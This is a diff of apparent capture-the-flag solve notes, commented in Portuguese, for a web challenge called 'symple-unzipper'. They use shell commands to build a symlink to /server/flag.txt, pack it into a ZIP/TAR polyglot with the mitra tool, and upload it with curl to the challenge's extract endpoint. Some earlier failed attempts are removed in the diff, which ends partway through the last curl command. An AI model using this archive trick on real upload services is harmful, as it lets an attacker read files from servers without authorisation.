@@ -2,64 +2,31 @@ curl -X 'POST' \
   'http://symple-unzipper.web.jctf.pro/extract' \
   -H 'accept: application/json' \
   -H 'Content-Type: multipart/form-data' \
-  -F 'file=@ls.zip;type=application/zip'
-
-curl -X 'POST' \
-  'http://symple-unzipper.web.jctf.pro/extract' \
-  -H 'accept: application/json' \
-  -H 'Content-Type: multipart/form-data' \
   -F 'file=@a.zip;type=application/zip'
 
-zip --symlinks myzip.zip myflag.txt ls.txt
+# Criação do symlink e dos archives (ZIP e TAR)
+ln -s /server/flag.txt flag.lnk
 
-curl -v -X 'POST' \
-  'http://symple-unzipper.web.jctf.pro/extract' \
-  -H 'accept: application/json' \
-  -H 'Content-Type: multipart/form-data' \
-  -F 'file=@myzip.zip;type=application/zip'
+zip --symlinks a.zip flag.lnk
+tar --owner=root --group=root --create --file give_me_flag.tar flag.lnk
 
-curl -v -X 'POST' \
-  'http://localhost/extract' \
-  -H 'accept: application/json' \
-  -H 'Content-Type: multipart/form-data' \
-  -F 'file=@myzip.zip;type=application/zip'
+# Criação do arquivo poliglota
+/opt/tools/mitra/mitra.py give_me_flag.tar a.zip
 
-curl -v -X 'POST' \
-  'http://localhost/extract' \
-  -H 'accept: application/json' \
-  -H 'Content-Type: multipart/form-data' \
-  -F 'file=@mytar.tar;type=application/zip'
-
-curl -v -X 'POST' \
-  'http://symple-unzipper.web.jctf.pro/extract' \
-  -H 'accept: application/json' \
-  -H 'Content-Type: multipart/form-data' \
-  -F 'file=@zipgo.tar;type=application/zip'
-
-
-curl -v -X 'POST' \
-  'http://localhost/extract' \
-  -H 'accept: application/json' \
-  -H 'Content-Type: multipart/form-data' \
-  -F 'file=@zipgo.tar;type=application/zip'
-
-tar --owner=root --group=root --create --file mytar.tar ls.txt flaglink
-/opt/tools/mitra/mitra.py mytar.tar ls.zip
-mv S* zipgo.tar
-
+# Esse também não vai (tar puro)
 curl -X 'POST' \
   'http://localhost/extract' \
   -H 'accept: application/json' \
   -H 'Content-Type: multipart/form-data' \
   -F 'file=@give_me_flag.tar;type=application/tar'
 
-tar --owner=root --group=root --create --file give_me_flag.tar flag.lnk
+# Vale renomear o arquivo gerado
+ls S* P*
+# 'P(200-400)-TAR[Zip].b85e2944.tar.zip'  'S(2800)-TAR-Zip.cc1382b4.zip.tar'
 
-$ tar --owner=root --group=root --create --file give_me_flag.tar flag.lnk
+mv S\(2800\)-TAR-Zip.cc1382b4.zip.tar hackit.tar
 
-$ tar tvf give_me_flag.tar 
-lrwxrwxrwx root/root         0 2022-06-13 21:28 flag.lnk -> flag.txt
-
+# Partiu Flag
 curl -X 'POST' \
   'http://symple-unzipper.web.jctf.pro/extract' \
   -H 'accept: application/json' \
